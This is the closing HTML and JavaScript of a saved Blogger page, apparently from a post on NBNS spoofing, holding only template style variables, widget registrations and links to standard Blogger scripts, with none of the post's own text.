'mobileHeadScript': '', 'ieCssRetrofitLinks': '\74!--[if IE]\76\74script type\75\42text/javascript\42 src\75\42//www.blogger.com/static/v1/jsbin/943085292-ieretrofit.js\42\76\74/script\76\n\74![endif]--\076', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/2ad9a09a40260f49', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'sf': 'n', 'tf': ''}}, {'name': 'skin', 'data': {'vars': {'date_border_size': '0', 'description_font': 'normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'body_background_gradient_cap': 'url(http://www.blogblog.com/1kt/awesomeinc/body_gradient_dark.png)', 'tabs_selected_background_color': '#444444', 'footer_background_gradient': 'none', 'date_background': 'transparent none no-repeat scroll top left', 'widget_border_radius': '0', 'post_title_text_color': '#ffffff', 'widget_font': 'normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'widget_link_hover_color': '#cccccc', 'link_visited_color': '#444444', 'mobile_background_size': 'auto', 'date_space': '30px', 'post_title_font': 'normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'tabs_text_color': '#ffffff', 'title_separator_border_size': '1px', 'header_background_gradient': 'none', 'widget_outer_background_gradient': 'none', 'widget_link_color': '#888888', 'mobile_button_color': '#ffffff', 'widget_title_font': 'normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'widget_outer_background_color': 'transparent', 'date_last_border_radius_bottom': '0', 'widget_outer_margin_top': '0', 'shadow_spread': '0', 'title_shadow_spread': '-1px', 'outer_shadow_spread': '0', 'keycolor': '#ffffff', 'image_shadow_spread': '0', 'image_background_color': '#222222', 'header_font': 'normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'header_background_color': 'transparent', 'date_header_border_radius_top': '0', 'widget_border_bevel_color': '#000000', 'tabs_border_color': '#222222', 'widget_background_color': '#141414', 'date_position': 'static', 'post_first_padding_top': '0', 'tabs_background_gradient': 'none', 'mobile_background_overlay': 'transparent none repeat scroll top left', 'date_border_color': '#222222', 'tabs_background_color': '#141414', 'widget_link_visited_color': '#444444', 'feed_text_color': '#ffffff', 'header_margin_top': '0', 'link_hover_color': '#cccccc', 'date_last_space_bottom': '20px', 'header_margin_bottom': '0', 'date_padding_bottom': '0', 'list_separator_border_size': '1px', 'description_text_color': '#ffffff', 'body_text_color': '#ffffff', 'header_padding_top': '22px', 'post_border_color': '#222222', 'footer_text_color': '#ffffff', 'post_background_color': '#141414', 'pager_space_top': '1em', 'endSide': 'right', 'startSide': 'left', 'body_background_size': 'auto', 'tabs_font': 'normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'body_font': 'normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'date_first_border_radius_top': '0', 'date_header_position': '15px', 'date_text_color': '#666666', 'widget_title_text_color': '#ffffff', 'image_border_color': 'transparent', 'separator_outdent': '15px', 'widget_text_color': '#ffffff', 'link_color': '#888888', 'widget_border_color': '#222222', 'pager_border_radius_top': '0', 'feed_link_color': '#888888', 'header_text_color': '#ffffff', 'footer_background_color': '#141414', 'widget_padding_top': '8px', 'feed_link_visited_color': '#444444', 'feed_link_hover_color': '#cccccc', 'date_font': 'normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif', 'tabs_selected_text_color': '#ffffff', 'date_side': 'right', 'post_border_bevel_color': '#222222', 'widget_padding_side': '15px', 'body_background_color': '#000000', 'image_border_radius': '0', 'pager_background_color': '#141414', 'widget_alternate_text_color': '#666666'}, 'override': 'pre {\n white-space: pre-wrap;       /* css-3 */\n white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */\n white-space: -pre-wrap;      /* Opera 4-6 */\n white-space: -o-pre-wrap;    /* Opera 7 */\n word-wrap: break-word;       /* Internet Explorer 5.5+ */\n background-color: #111111;\n border-width:thin;\n border-color: #000000;\n border-style:solid;\n padding: 6px;\n /* color: #444444; */\n}'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '/?view\75classic'}, 'flipcard': {'name': 'flipcard', 'url': '/?view\75flipcard'}, 'magazine': {'name': 'magazine', 'url': '/?view\75magazine'}, 'mosaic': {'name': 'mosaic', 'url': '/?view\75mosaic'}, 'sidebar': {'name': 'sidebar', 'url': '/?view\75sidebar'}, 'snapshot': {'name': 'snapshot', 'url': '/?view\75snapshot'}, 'timeslide': {'name': 'timeslide', 'url': '/?view\75timeslide'}}}]);
_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text1', 'sidebar-right-1', null, document.getElementById('Text1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', null, document.getElementById('BlogArchive1'), {'languageDirection': 'ltr'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ProfileView', new _WidgetInfo('Profile1', 'sidebar-right-1', null, document.getElementById('Profile1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_LinkListView', new _WidgetInfo('LinkList1', 'sidebar-right-1', null, document.getElementById('LinkList1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', null, document.getElementById('Attribution1'), {'attribution': 'Awesome Inc. template. Powered by \74a href\75\47http://www.blogger.com\47 target\75\47_blank\47\76Blogger\74/a\76.'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', null, document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', null, document.getElementById('Navbar1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', null, document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': '//www.blogger.com/static/v1/jsbin/1618545767-lbx.js', 'lightboxCssUrl': '//www.blogger.com/static/v1/v-css/228702327-lightbox_bundle.css'}, 'displayModeFull'));
</script>

<link href="nbns-spoofing-on-your-way-to-world_files/228702327-lightbox_bundle.css" rel="stylesheet" type="text/css"><script src="nbns-spoofing-on-your-way-to-world_files/1618545767-lbx.js" type="text/javascript"></script></body></html>